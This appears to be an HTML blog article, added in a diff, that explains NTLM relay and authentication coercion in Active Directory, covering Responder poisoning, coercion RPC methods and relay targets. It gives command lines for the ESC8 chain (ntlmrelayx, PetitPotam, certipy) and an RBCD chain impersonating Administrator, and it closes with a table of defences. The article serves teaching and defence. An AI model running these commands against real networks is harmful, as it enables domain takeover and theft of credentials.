@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Coercion and NTLM Relay — Satej Chaudhari</title>
+  <meta name="description" content="How authentication coercion and NTLM relay chain together — poisoning, forcing a host to authenticate, and forwarding that authentication to SMB, LDAP, or AD CS.">
+
+  <link rel="icon" type="image/svg+xml" href="../assets/img/favicon.svg">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+
+  <header class="site-header">
+    <div class="wrap-wide">
+      <a class="brand" href="../index.html">
+        <span class="brand-mark">SC</span>
+        <span class="brand-name">Satej Chaudhari</span>
+      </a>
+
+      <nav class="site-nav">
+        <a href="../index.html">Home</a>
+        <a href="../writeups.html">Writeups</a>
+        <a href="../blog.html">Blog</a>
+        <a href="../theory.html">Theory</a>
+        <a href="../toolkit.html">Toolkit</a>
+        <a href="https://github.com/satejchaudhari" target="_blank" rel="noopener" class="nav-external">GitHub</a>
+      </nav>
+
+      <button class="nav-toggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <line x1="3" y1="6" x2="21" y2="6"></line>
+          <line x1="3" y1="12" x2="21" y2="12"></line>
+          <line x1="3" y1="18" x2="21" y2="18"></line>
+        </svg>
+      </button>
+    </div>
+  </header>
+
+  <main class="wrap post">
+    <a class="post-back" href="../theory.html">&larr; back to theory</a>
+
+    <article>
+      <header class="post-header">
+        <span class="tag">AD</span>
+
+        <h1 class="post-title">Coercion and NTLM Relay</h1>
+
+        <p class="post-meta">
+          <time datetime="2026-08-18">2026-08-18</time>
+          <span>&middot; 11 min read</span>
+        </p>
+      </header>
+
+      <div class="post-body">
+        <p>
+          NTLM relay is one of the most powerful techniques on an internal network, and
+          coercion is what makes it reliable. Together they let you take an authentication
+          that belongs to someone else — often a domain controller's own machine account —
+          and use it against a service that will honour it. This page explains the whole
+          chain: how authentication is captured or forced, how it is relayed, and why the
+          defences are exactly the three controls they are.
+        </p>
+
+        <h2>Why relay works at all</h2>
+
+        <p>
+          <a href="2026-08-18-ntlm.html">NTLM</a> is a challenge-response protocol. When a
+          client authenticates, it proves knowledge of its NT hash by answering a
+          server-issued challenge — it never sends anything you can simply replay. But it
+          also has no inherent binding between the authentication and the specific
+          connection it was meant for. So if you can get in the middle, you can take the
+          client's response to <em>your</em> challenge and present it to a
+          <em>different</em> server, authenticating as the client there.
+        </p>
+
+        <p>
+          That is relaying. You are not cracking anything and not replaying a static
+          credential — you are a live man-in-the-middle forwarding a valid authentication to
+          a target of your choosing, while it is still fresh.
+        </p>
+
+        <h2>Getting the victim to authenticate</h2>
+
+        <p>
+          Relaying needs a victim to authenticate to you in the first place. There are two
+          ways to arrange that: wait for it (poisoning) or force it (coercion).
+        </p>
+
+        <h3>Poisoning — LLMNR/NBT-NS</h3>
+
+        <p>
+          When a Windows host fails to resolve a name over DNS, it broadcasts the query to
+          the local segment over LLMNR, NBT-NS, or mDNS: "does anyone know where
+          <code>FILESERVR</code> is?" (note the typo — mistyped and stale names are constant).
+          <a href="../toolkit.html">Responder</a> answers "yes, it's me", the victim connects
+          and authenticates, and you have its NetNTLM. This is opportunistic — you catch
+          whatever mistakes happen on the wire.
+        </p>
+
+        <h3>Coercion — forcing the callback</h3>
+
+        <p>
+          Coercion is deterministic. Certain RPC methods, by design, make a target connect
+          to a path you specify — and when it connects, it authenticates, as its
+          <strong>machine account</strong>. You do not wait for a mistake; you call the
+          method and the target authenticates on command.
+        </p>
+
+        <table>
+          <thead>
+            <tr><th>Method</th><th>Protocol</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>PrinterBug</td><td>MS-RPRN — the print spooler's change-notification RPC</td></tr>
+            <tr><td>PetitPotam</td><td>MS-EFSRPC — the Encrypting File System remote protocol</td></tr>
+            <tr><td>DFSCoerce</td><td>MS-DFSNM — DFS namespace management</td></tr>
+            <tr><td>ShadowCoerce</td><td>MS-FSRVP — the File Server VSS agent</td></tr>
+          </tbody>
+        </table>
+
+        <p>
+          <a href="../toolkit.html">Coercer</a> automates all of these, firing every known
+          method so that one missing patch or hardening is enough. Coercing a
+          <em>domain controller</em> is the prize, because a DC's machine account is a
+          high-value identity to relay.
+        </p>
+
+        <h2>Where you relay to</h2>
+
+        <p>
+          Relaying only succeeds where a specific protection is missing on the target. This
+          is the whole game — enumerate the missing protections first, then relay to those.
+        </p>
+
+        <table>
+          <thead>
+            <tr><th>Relay target</th><th>Requires</th><th>Yields</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>SMB</td><td>SMB signing NOT required on the target</td><td>SAM/LSA dump, command execution</td></tr>
+            <tr><td>LDAP / LDAPS</td><td>Channel binding / signing off</td><td>RBCD setup, Shadow Credentials, DCSync rights</td></tr>
+            <tr><td>AD CS web enrolment (ESC8)</td><td>EPA not enforced on the CA web endpoint</td><td>A certificate as the victim → a TGT</td></tr>
+            <tr><td>HTTP (other)</td><td>Varies by endpoint</td><td>Application-specific access</td></tr>
+          </tbody>
+        </table>
+
+        <blockquote>
+          You cannot relay an authentication back to the host it came from — that was fixed
+          long ago. The whole point is to relay <em>elsewhere</em>: coerce host A, relay its
+          auth to host or service B.
+        </blockquote>
+
+        <h2>The two highest-impact chains</h2>
+
+        <h3>ESC8 — DC to AD CS to domain compromise</h3>
+
+        <p>
+          The current king of relay chains. Coerce a domain controller into authenticating
+          to you, relay that machine-account authentication to the AD CS web enrolment
+          endpoint, and request a certificate <em>as the DC</em>. A certificate can be used
+          for Kerberos PKINIT, so you turn it into a TGT for the DC — and a DC's TGT is
+          effectively the domain.
+        </p>
+
+        <pre><code># 1. relay to the CA web endpoint, asking for a DC template cert
+ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support \
+  --adcs --template DomainController
+
+# 2. coerce the DC to authenticate to us
+PetitPotam.py -u user -p pass attacker_ip dc01_ip
+
+# 3. use the issued certificate to get a TGT
+certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10</code></pre>
+
+        <h3>RBCD via LDAP</h3>
+
+        <p>
+          Relay a machine account's authentication to LDAP and configure
+          <strong>resource-based constrained delegation</strong> so that a computer account
+          you control is allowed to impersonate any user to the coerced machine. Then request
+          a service ticket as Administrator and walk in. See
+          <a href="2026-08-18-delegation.html">Delegation</a> for the RBCD mechanism.
+        </p>
+
+        <pre><code>ntlmrelayx.py -t ldap://dc01 --delegate-access
+# coerce the target computer; ntlmrelayx sets msDS-AllowedToActOnBehalfOfOtherIdentity
+getST.py -spn cifs/target -impersonate Administrator corp.local/attacker_pc\$</code></pre>
+
+        <h2>Capture versus relay</h2>
+
+        <p>
+          When you poison with Responder, you choose one of two modes. In
+          <strong>capture</strong> mode, Responder's own SMB/HTTP servers accept the
+          authentication and log the NetNTLM hash for offline cracking. In
+          <strong>relay</strong> mode, you turn Responder's SMB and HTTP servers off so
+          <a href="../toolkit.html">ntlmrelayx</a> can take the authentication and forward it
+          live. Capture is for crackable passwords; relay is for when the hash is
+          uncrackable but the identity is useful.
+        </p>
+
+        <h2>Detection and defence</h2>
+
+        <table>
+          <thead>
+            <tr><th>Control</th><th>What it stops</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>Require SMB signing</td><td>Breaks SMB relay outright — the single most important control</td></tr>
+            <tr><td>Enforce LDAP channel binding &amp; signing</td><td>Closes the RBCD and Shadow Credential relay paths</td></tr>
+            <tr><td>Enable EPA on AD CS web enrolment</td><td>Kills the ESC8 chain</td></tr>
+            <tr><td>Disable the Print Spooler on DCs</td><td>Removes the PrinterBug coercion vector</td></tr>
+            <tr><td>Disable LLMNR / NBT-NS</td><td>Removes the poisoning opportunity Responder relies on</td></tr>
+            <tr><td>Patch coercion methods</td><td>Reduces the set of RPC methods Coercer can fire — though new ones keep appearing</td></tr>
+          </tbody>
+        </table>
+
+        <h2>The takeaway</h2>
+
+        <p>
+          The chain is always the same shape: <em>make someone authenticate to you</em>
+          (poison or coerce), then <em>forward that authentication</em> to a service missing
+          its relay protection. Coercing a domain controller and relaying to AD CS is the
+          headline path because it converts a machine account's authentication into a
+          domain-controlling certificate. Every defence maps to one link in the chain —
+          signing, channel binding, EPA, spooler, LLMNR. The tools live in the
+          <a href="../toolkit.html">Toolkit</a> (Responder, Coercer, ntlmrelayx, krbrelayx);
+          the protocol background is on the <a href="2026-08-18-ntlm.html">NTLM</a> and
+          <a href="2026-08-18-adcs.html">AD CS</a> pages.
+        </p>
+      </div>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+    <div class="wrap-wide">
+      <p>&copy; 2026 Satej Chaudhari</p>
+      <div class="footer-links">
+        <a href="../writeups.html">Writeups</a>
+        <a href="../blog.html">Blog</a>
+        <a href="../theory.html">Theory</a>
+        <a href="../toolkit.html">Toolkit</a>
+      </div>
+    </div>
+  </footer>
+
+  <script src="../assets/js/main.js"></script>
+</body>
+</html>
